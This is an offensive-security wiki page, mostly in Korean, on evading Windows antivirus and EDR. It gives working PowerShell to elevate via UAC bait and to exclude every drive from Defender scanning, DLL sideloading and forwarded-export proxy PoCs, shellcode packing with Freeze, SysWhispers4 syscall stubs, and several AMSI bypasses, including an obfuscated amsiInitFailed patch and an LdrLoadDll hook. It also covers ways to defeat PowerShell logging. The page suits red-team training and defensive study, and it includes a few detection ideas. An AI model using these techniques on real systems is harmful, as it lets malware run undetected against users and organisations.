# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에** [**@m2rc_p**](https://twitter.com/m2rc_p)**가 작성했습니다!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 동작하지 못하게 하는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV인 것처럼 가장해 Windows Defender가 동작하지 못하게 하는 도구.
- [관리자라면 Defender 비활성화](basic-powershell-for-pentesters/README.md)

### Defender를 조작하기 전에 Installer-style UAC bait

공개 loader는 게임 치트로 가장하는 경우가 많으며, 종종 서명되지 않은 Node.js/Nexe installer 형태로 배포되어 먼저 **사용자에게 elevation을 요청한 다음** Defender를 무력화한다. 흐름은 간단하다:

1. `net session`으로 administrative context를 확인한다. 이 명령은 호출자가 admin 권한을 가질 때만 성공하므로, 실패하면 loader가 standard user로 실행 중임을 의미한다.
2. 즉시 `RunAs` verb로 자신을 다시 실행하여 원래 command line을 유지한 채 예상되는 UAC consent prompt를 띄운다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자들은 이미 자신이 “cracked” 소프트웨어를 설치하고 있다고 믿고 있으므로, 이 프롬프트는 보통 승인되며, malware가 Defender의 정책을 변경하는 데 필요한 권한을 얻게 됩니다.

### 모든 드라이브 문자에 대한 Blanket `MpPreference` exclusions

권한이 상승하면, GachiLoader 스타일 체인은 Defender를 완전히 끄는 대신 Defender의 blind spots를 최대화합니다. 로더는 먼저 GUI watchdog (`taskkill /F /IM SecHealthUI.exe`)을 종료한 다음, **극도로 광범위한 exclusions**를 적용해 모든 사용자 프로필, 시스템 디렉터리, 그리고 이동식 디스크가 스캔 불가능해지도록 합니다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 그들이 로드하려고 시도하는 DLL 파일을 출력합니다.

저는 직접 **DLL Hijackable/Sideloadable programs**를 **explore**해보는 것을 강력히 추천합니다. 이 technique은 제대로 수행하면 꽤 stealthy하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 잡힐 수 있습니다.

프로그램이 로드하기를 기대하는 이름의 malicious DLL을 그냥 넣는 것만으로는 payload가 로드되지 않습니다. 프로그램은 그 DLL 안의 특정 functions를 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 또 다른 technique을 사용합니다.

**DLL Proxying**은 program이 proxy(그리고 malicious) DLL로 보내는 calls를 원래 DLL로 forwarding하여, program의 functionality를 유지하면서 payload의 execution을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project를 [@flangvik](https://twitter.com/Flangvik/)에서 사용할 것입니다.

제가 따랐던 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 줄 것이다: DLL 소스 코드 템플릿과 원본으로 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode([SGN](https://github.com/EgeBalci/sgn)으로 인코딩됨)와 proxy DLL 모두 [antiscan.me](https://antiscan.me)에서 0/26 Detection rate를 보입니다! 이 정도면 성공이라고 하겠습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)의 DLL Sideloading에 대한 내용과 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)도 꼭 보시길 **강력히 권장**합니다. 더 깊이 있게 논의한 내용을 더 자세히 배울 수 있습니다.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules는 실제로 "forwarders"인 functions를 export할 수 있습니다: code를 가리키는 대신, export entry에 `TargetDll.TargetFunc` 형식의 ASCII string이 들어 있습니다. caller가 export를 resolve하면 Windows loader는 다음을 수행합니다:

- 아직 load되지 않았다면 `TargetDll`을 load
- 그 안에서 `TargetFunc`를 resolve

이해해야 할 핵심 behavior:
- `TargetDll`이 KnownDLL이면, 보호된 KnownDLLs namespace에서 공급됩니다(예: ntdll, kernelbase, ole32).
- `TargetDll`이 KnownDLL이 아니면, 일반 DLL search order가 사용되며, 여기에는 forward resolution을 수행하는 module의 directory가 포함됩니다.

이것은 indirect sideloading primitive를 가능하게 합니다: non-KnownDLL module name으로 forward된 function을 export하는 signed DLL을 찾은 다음, 그 signed DLL과 정확히 forward된 target module 이름과 같은 attacker-controlled DLL을 같은 directory에 배치합니다. forwarded export가 호출되면 loader는 forward를 resolve하고 같은 directory에서 당신의 DLL을 load하여 DllMain을 실행합니다.

Windows 11에서 관찰된 예시:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로, 일반적인 검색 순서로 resolve된다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사한다
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 동일한 폴더에 악성 `NCRYPTPROV.dll`을 드롭한다. 최소한의 DllMain만 있어도 코드 실행을 얻을 수 있으며, DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거하기:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
관찰된 동작:
- rundll32 (signed)가 side-by-side `keyiso.dll` (signed)를 로드함
- `KeyIsoSetAuditingInterface`를 해석하는 동안, loader가 forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동함
- 그런 다음 loader가 `NCRYPTPROV.dll`을 `C:\test`에서 로드하고 `DllMain`을 실행함
- `SetAuditingInterface`가 구현되지 않았더라도, `DllMain`이 이미 실행된 후에야 "missing API" error가 발생함

사냥 팁:
- 대상 module이 KnownDLL이 아닌 forwarded exports에 집중하라. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열됨.
- 다음과 같은 tooling으로 forwarded exports를 열거할 수 있음:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder inventory를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense 아이디어:
- 서명된 DLL을 non-system 경로에서 로드한 뒤, 같은 base name을 가진 non-KnownDLLs를 해당 디렉터리에서 로드하는 LOLBins(예: rundll32.exe)를 모니터링
- `rundll32.exe` → non-system `keyiso.dll` → user-writable 경로의 `NCRYPTPROV.dll` 같은 process/module chain에 대해 알림
- code integrity policies(WDAC/AppLocker)를 적용하고 application 디렉터리에서 write+execute를 금지

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용해 shellcode를 stealthy한 방식으로 load하고 execute할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 그냥 고양이와 쥐 게임입니다. 오늘 잘 통하는 방법이 내일은 탐지될 수 있으므로, 한 가지 도구만 절대 의존하지 말고 가능하면 여러 evasion 기법을 함께 체이닝해 보세요.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR은 종종 `ntdll.dll` syscall stub에 **user-mode inline hooks**를 겁니다. 이런 hook을 우회하려면, 올바른 **SSN** (System Service Number)을 로드하고 hook된 export entrypoint를 실행하지 않은 채 kernel mode로 전환하는 **direct** 또는 **indirect** syscall stub을 생성할 수 있습니다.

**Invocation options:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` instruction을 넣습니다(`ntdll` export를 거치지 않음).
- **Indirect**: `ntdll` 안의 기존 `syscall` gadget으로 점프해서 kernel transition이 `ntdll`에서 시작된 것처럼 보이게 합니다(heuristic evasion에 유용); **randomized indirect**는 호출마다 pool에서 gadget을 하나 고릅니다.
- **Egg-hunt**: 디스크에 정적인 `0F 05` opcode sequence를 박아 넣지 않도록 하고, runtime에 syscall sequence를 찾습니다.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes를 읽는 대신 virtual address 순으로 syscall stub를 정렬해서 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 map한 뒤, 그 `.text`에서 SSN을 읽고 unmap합니다(메모리상의 모든 hook을 우회).
- **RecycledGate**: stub가 clean할 때는 VA-sorted SSN inference와 opcode validation을 결합하고, hook되어 있으면 VA inference로 fallback합니다.
- **HW Breakpoint**: `syscall` instruction에 DR0를 설정하고 VEH를 사용해, hooked bytes를 파싱하지 않고 runtime에 `EAX`에서 SSN을 캡처합니다.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에는 AV가 **디스크의 파일만** 스캔할 수 있었기 때문에, 만약 어떻게든 payload를 **직접 in-memory에서 실행**할 수 있다면, AV는 이를 막을 방법이 없었습니다. 충분한 가시성이 없었기 때문입니다.

AMSI 기능은 다음 Windows 구성 요소에 통합되어 있습니다.

- User Account Control, 또는 UAC (EXE, COM, MSI, 또는 ActiveX 설치의 elevation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이 기능은 script contents를 암호화되지 않고 난독화되지 않은 형태로 노출하여 antivirus 솔루션이 script behavior를 검사할 수 있게 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 alert가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙인 뒤, script가 실행된 executable의 path를 표시하는데, 이 경우 `powershell.exe`입니다.

우리는 어떤 file도 disk에 drop하지 않았지만, AMSI 때문에 in-memory에서 여전히 탐지되었습니다.

또한 **.NET 4.8**부터는 C# code도 AMSI를 통해 실행됩니다. 이는 in-memory execution을 위해 `Assembly.Load(byte[])`를 사용할 때도 영향을 줍니다. 그래서 AMSI를 evasion하려는 경우 in-memory execution에는 더 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다.

- **Obfuscation**

AMSI는 주로 static detections에 의존하므로, 로드하려는 scripts를 수정하는 것은 detection evading에 좋은 방법이 될 수 있습니다.

하지만 AMSI는 여러 겹의 난독화가 있어도 scripts를 unobfuscating할 수 있는 능력이 있으므로, obfuscation은 방식에 따라 좋지 않은 선택일 수 있습니다. 즉, evasion이 그다지 간단하지 않습니다. 다만 때로는 variable names 몇 개만 바꿔도 충분할 수 있으므로, 얼마나 많이 flagged 되었는지에 따라 다릅니다.

- **AMSI Bypass**

AMSI는 powershell (또한 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되므로, 권한이 없는 사용자로 실행 중이더라도 쉽게 tamper할 수 있습니다. AMSI 구현상의 이 결함 때문에 연구자들은 AMSI scanning을 evading하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI initialization이 실패하도록 강제(amsiInitFailed)하면 현재 process에 대해 scan이 시작되지 않습니다. 이 방법은 원래 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었고 Microsoft는 더 넓은 사용을 막기 위한 signature를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI를 현재 powershell 프로세스에서 사용할 수 없게 만드는 데에는 powershell 코드 한 줄이면 충분했다. 물론 이 한 줄은 AMSI 자체에 의해 플래그되었기 때문에, 이 technique를 사용하려면 약간의 수정이 필요하다.

여기 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass가 있다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기법은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)가 발견했으며, `amsi.dll`의 "AmsiScanBuffer" 함수 주소를 찾아 사용자 제공 입력을 스캔하는 이 함수를 `E_INVALIDARG` 코드를 반환하는 명령으로 덮어쓰는 방식이다. 이렇게 하면 실제 스캔 결과가 0을 반환하게 되고, 이는 clean 결과로 해석된다.

> [!TIP]
> 보다 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보라.

또한 powershell에서 AMSI를 우회하는 데 사용되는 다른 많은 기법도 있다. 더 알아보려면 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하라.

### amsi.dll 로드를 방지해 AMSI 차단하기 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 프로세스에 로드된 이후에만 초기화된다. 언어에 독립적인 견고한 우회 방법은 요청된 모듈이 `amsi.dll`일 때 에러를 반환하도록 `ntdll!LdrLoadDll`에 user-mode hook을 거는 것이다. 그 결과 AMSI는 절대 로드되지 않으며 해당 프로세스에서는 어떤 스캔도 발생하지 않는다.

구현 개요(x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 custom loaders 전반에서 작동합니다(즉, 그렇지 않으면 AMSI를 로드할 모든 것).
- stdin으로 script를 전달하는 방식(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용해 긴 command-line artefacts를 피하세요.
- LOLBins를 통해 실행되는 loaders에서 사용되는 사례가 있습니다(예: `regsvr32`가 `DllRegisterServer`를 호출).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 도구는 AMSI bypass용 script도 생성합니다.
**[https://amsibypass.com/](https://amsibypass.com/)** 도구는 랜덤화된 user-defined function, variables, characters expression을 사용해 signature를 피하고, PowerShell keywords에 random character casing을 적용해 signature를 피하는 AMSI bypass script도 생성합니다.

**탐지된 signature 제거**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용해 현재 process의 memory에서 탐지된 AMSI signature를 제거할 수 있습니다. 이 도구는 현재 process의 memory를 스캔해 AMSI signature를 찾은 뒤, 이를 NOP instructions로 덮어써서 memory에서 효과적으로 제거합니다.

**AMSI를 사용하는 AV/EDR products**

**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 AMSI를 사용하는 AV/EDR products 목록을 찾을 수 있습니다.

**Powershell version 2 사용**
PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로, AMSI에 의해 스캔되지 않고 script를 실행할 수 있습니다. 이렇게 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능이다. 감사와 문제 해결에 유용할 수 있지만, **탐지를 회피하려는 공격자에게는 문제가 될 수 있다**.

PowerShell logging을 우회하려면 다음 기술을 사용할 수 있다:

- **PowerShell Transcription과 Module Logging 비활성화**: 이를 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있다.
- **Powershell version 2 사용**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 스캔되지 않은 채 스크립트를 실행할 수 있다. 이렇게 할 수 있다: `powershell.exe -version 2`
- **Unmanaged Powershell Session 사용**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)을 사용해 방어 없이 powershell을 실행한다(`Cobal Strike`의 `powerpick`이 사용하는 방식이다).


## Obfuscation

> [!TIP]
> 여러 obfuscation 기법은 데이터를 암호화하는 데 의존하는데, 이는 binary의 entropy를 높여 AV와 EDR이 더 쉽게 탐지하게 만들 수 있다. 이 점에 주의하고, 민감하거나 숨겨야 하는 코드의 특정 섹션에만 암호화를 적용하는 것이 좋다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상용 fork)를 사용하는 malware를 분석할 때는 decompiler와 sandbox를 막는 여러 단계의 보호에 자주 직면한다. 아래 workflow는 이후 dnSpy나 ILSpy 같은 도구에서 C#으로 decompile할 수 있는 거의 원본에 가까운 IL을 안정적으로 **복원**한다.

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* static constructor (`<Module>.cctor`) 안에서 복호화한다. 이 과정에서 PE checksum도 패치하므로, 무언가를 수정하면 binary가 crash한다. **AntiTamperKiller**를 사용해 암호화된 metadata table을 찾고, XOR key를 복구하며, clean assembly를 다시 작성한다:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output에는 자체 unpacker를 만들 때 유용할 수 있는 6개의 anti-tamper parameter (`key0-key3`, `nameHash`, `internKey`)가 포함된다.

2.  Symbol / control-flow 복구 – *clean* 파일을 **de4dot-cex**(de4dot의 ConfuserEx-aware fork)에 넣는다.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile을 선택한다
• de4dot는 control-flow flattening을 되돌리고, 원래 namespace, class, variable name을 복원하며 constant string을 decrypt한다.

3.  Proxy-call stripping – ConfuserEx는 직접 method call을 가벼운 wrapper(aka *proxy calls*)로 바꿔 decompilation을 더 어렵게 만든다. **ProxyCall-Remover**로 이를 제거한다:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 `Class8.smethod_10` 같은 불명확한 wrapper function 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 정상적인 .NET API가 보여야 한다.

4.  수동 정리 – 결과 binary를 dnSpy에서 실행한 뒤, 큰 Base64 blob이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *real* payload를 찾는다. 종종 malware는 이를 `<Module>.byte_0` 안에서 초기화되는 TLV-encoded byte array로 저장한다.

위 chain은 악성 sample을 실행할 필요 없이 execution flow를 복원한다 – offline workstation에서 작업할 때 유용하다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 custom attribute를 생성하는데, 이를 IOC로 사용해 sample을 자동 분류할 수 있다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈소스 포크를 제공하여, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)과 tamper-proofing을 통해 소프트웨어 보안을 향상시키는 것이다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하거나 compiler를 수정하지 않고도, compile time에 `C++11/14` 언어를 사용해 obfuscated code를 생성하는 방법을 보여준다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework로 생성된 obfuscated operations 레이어를 추가하여 application을 crack하려는 사람의 작업을 조금 더 어렵게 만든다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys를 포함한 다양한 pe files를 obfuscate할 수 있는 x64 binary obfuscator이다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 executables를 위한 간단한 metamorphic code engine이다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하는 LLVM 지원 언어용 세밀한 code obfuscation framework이다. ROPfuscator는 일반 instructions를 ROP chains로 변환하여 assembly code level에서 program을 obfuscate하고, 정상적인 control flow에 대한 우리의 직관을 무너뜨린다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter이다
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 이를 load할 수 있다

## SmartScreen & MoTW

인터넷에서 일부 executables를 다운로드해 실행할 때 이 화면을 본 적이 있을 것이다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 applications의 실행으로부터 최종 사용자를 보호하기 위한 security mechanism이다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 reputation-based approach로 동작하며, 흔하지 않게 다운로드되는 applications는 SmartScreen을 트리거해 최종 사용자가 file을 실행하지 못하도록 경고하고 차단한다(하지만 More Info -> Run anyway를 클릭하면 여전히 실행할 수 있다).

